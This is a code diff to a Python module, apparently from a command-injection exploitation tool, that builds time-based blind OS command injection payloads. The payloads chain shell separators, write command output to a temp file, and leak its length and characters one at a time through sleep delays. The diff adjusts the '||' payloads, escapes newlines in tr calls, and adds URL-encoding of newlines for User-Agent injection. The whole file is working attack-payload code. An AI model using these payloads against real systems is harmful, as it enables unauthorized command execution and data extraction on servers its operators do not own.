@@ -16,7 +16,7 @@
 """
 
 import urllib
-
+from src.utils import settings
 """
   The "tempfile-based" technique on Semiblind-based OS Command Injection.
   The available "tempfile-based" payloads.
@@ -59,7 +59,7 @@ def decision(separator, j, TAG, OUTPUT_TEXTFILE, delay, http_request_method):
   elif separator == "||" :
     payload = ("| " + 
               "echo " + TAG + " > " + OUTPUT_TEXTFILE + " | "+ 
-              "[ " + str(j) + " -ne $(cat \""+OUTPUT_TEXTFILE+"\" | tr -d '\n' | wc -c) ] " + separator + " "
+              "[ " + str(j) + " -ne $(cat \""+OUTPUT_TEXTFILE+"\" | tr -d '\\n' | wc -c) ] " + separator + " "
               "sleep " + str(delay) + " "
               )  
   else:
@@ -101,7 +101,7 @@ def decision_alter_shell(separator, j, TAG, OUTPUT_TEXTFILE, delay, http_request
       separator = urllib.unquote(separator)
 
   elif separator == "||" :
-    payload = ("| " +
+    payload = (separator + " " +
               "$(python -c \"f = open('" + OUTPUT_TEXTFILE + "', 'w')\nf.write('" + TAG + "')\nf.close()\n\")\n" + " "
               # Find the length of the output, using readline().
               "[ " + str(j) + " -ne $(python -c \"with open(\'" + OUTPUT_TEXTFILE + "\') as file: print len(file.readline())\") ] " + separator + " "
@@ -109,7 +109,11 @@ def decision_alter_shell(separator, j, TAG, OUTPUT_TEXTFILE, delay, http_request
               ) 
   else:
     pass
-  
+
+    # New line fixation
+  if settings.USER_AGENT_INJECTION == True:
+    payload = payload.replace("\n","%0d")
+
   return payload
 
 #-----------------------------------------------
@@ -147,9 +151,9 @@ def cmd_execution(separator, cmd, j, OUTPUT_TEXTFILE, delay, http_request_method
       separator = urllib.unquote(separator)
     
   elif separator == "||" :                
-    payload = ("| " +
+    payload = ("| " + 
               "echo $(" + cmd + ") > " + OUTPUT_TEXTFILE + " | "+ 
-              "[ " + str(j) + " -ne $(cat \""+OUTPUT_TEXTFILE+"\" | tr -d '\n' | wc -c) ] " + separator + " "
+              "[ " + str(j) + " -ne $(cat \""+OUTPUT_TEXTFILE+"\" | tr -d '\\n' | wc -c) ] " + separator + " "
               "sleep " + str(delay) + " "
               )                     
   else:
@@ -191,13 +195,17 @@ def cmd_execution_alter_shell(separator, cmd, j, OUTPUT_TEXTFILE, delay, http_re
       separator = urllib.unquote(separator) 
 
   elif separator == "||" :     
-    payload = ("| " +
+    payload = (separator + " " + 
               "$(python -c \"f = open('" + OUTPUT_TEXTFILE + "', 'w')\nf.write('$(echo $("+cmd+"))')\nf.close()\n\")\n" + " "
               "[ "+ str(j) +" -ne $(python -c \"with open(\'" + OUTPUT_TEXTFILE + "\') as file: print len(file.readline())\") ] " + separator + " "
               "$(python -c \"import time\ntime.sleep(0)\") | $(python -c \"import time\ntime.sleep("+ str(delay) +")\")"
               )                    
   else:
     pass
+
+    # New line fixation
+  if settings.USER_AGENT_INJECTION == True:
+    payload = payload.replace("\n","%0d")
 
   return payload
 
@@ -208,7 +216,7 @@ def get_char(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, delay, http_r
   
   if separator == ";" :
     payload = (separator + " "
-              "str=$(cat " + OUTPUT_TEXTFILE + "|tr '\n' ' '|cut -c " + str(num_of_chars) + "|od -N 1 -i|head -1|tr -s ' '|cut -d ' ' -f 2)" + separator +
+              "str=$(cat " + OUTPUT_TEXTFILE + "|tr '\\n' ' '|cut -c " + str(num_of_chars) + "|od -N 1 -i|head -1|tr -s ' '|cut -d ' ' -f 2)" + separator +
               "if [ " + str(ascii_char) + " != ${str} ]" + separator +
               "then sleep 0" + separator +
               "else sleep " + str(delay) + separator +
@@ -223,7 +231,7 @@ def get_char(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, delay, http_r
       ampersand = "&"
     payload = (ampersand + " " +
               "sleep 0 " +  separator + " "
-              "str=$(cat " + OUTPUT_TEXTFILE + "|tr '\n' ' '|cut -c " + str(num_of_chars) + "|od -N 1 -i|head -1|tr -s ' '|cut -d ' ' -f 2) " + separator + " "
+              "str=$(cat " + OUTPUT_TEXTFILE + "|tr '\\n' ' '|cut -c " + str(num_of_chars) + "|od -N 1 -i|head -1|tr -s ' '|cut -d ' ' -f 2) " + separator + " "
               "[ " + str(ascii_char) + " -eq ${str} ] " +  separator + " "
               "sleep "+ str(delay) + " "
               )
@@ -231,8 +239,8 @@ def get_char(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, delay, http_r
       separator = urllib.unquote(separator)
       
   elif separator == "||" :
-    payload = ("| " +
-              "[ " + str(ascii_char) + " -ne  $(cat " + OUTPUT_TEXTFILE + "|tr '\n' ' '|cut -c " + str(num_of_chars) + "|od -N 1 -i|head -1|tr -s ' '|cut -d ' ' -f 2) ] " + separator + 
+    payload = ("| " + 
+              "[ " + str(ascii_char) + " -ne  $(cat " + OUTPUT_TEXTFILE + "|tr '\\n' ' '|cut -c " + str(num_of_chars) + "|od -N 1 -i|head -1|tr -s ' '|cut -d ' ' -f 2) ] " + separator + 
               "sleep " + str(delay) + " "
               )
   else:
@@ -270,13 +278,17 @@ def get_char_alter_shell(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, d
       separator = urllib.unquote(separator)
 
   elif separator == "||" :
-    payload = ("| " +
+    payload = (separator + " " + 
               "[ " + str(ascii_char) + " -ne  $(python -c \"with open('"+OUTPUT_TEXTFILE+"') as file: print ord(file.readlines()[0]["+str(num_of_chars-1)+"])\nexit(0)\") ] " + separator + 
               "$(python -c \"import time\ntime.sleep(0)\") | $(python -c \"import time\ntime.sleep("+ str(delay) +")\")"
               )
     
   else:
     pass
+
+    # New line fixation
+  if settings.USER_AGENT_INJECTION == True:
+    payload = payload.replace("\n","%0d")
   
   return payload
 
@@ -349,12 +361,15 @@ def fp_result_alter_shell(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, 
       separator = urllib.unquote(separator)
 
   elif separator == "||" :
-
-    payload = ("| " +
+    payload = (separator + " " +
               "[ " + str(ascii_char) + " -ne  $(python -c \"with open('"+OUTPUT_TEXTFILE+"') as file: print file.readlines()[0]["+str(num_of_chars-1)+"]\nexit(0)\") ] " + separator + 
               "$(python -c \"import time\ntime.sleep(0)\") | $(python -c \"import time\ntime.sleep("+ str(delay) +")\")"
               )
   else:
     pass
+
+    # New line fixation
+  if settings.USER_AGENT_INJECTION == True:
+    payload = payload.replace("\n","%0d")
   
   return payload
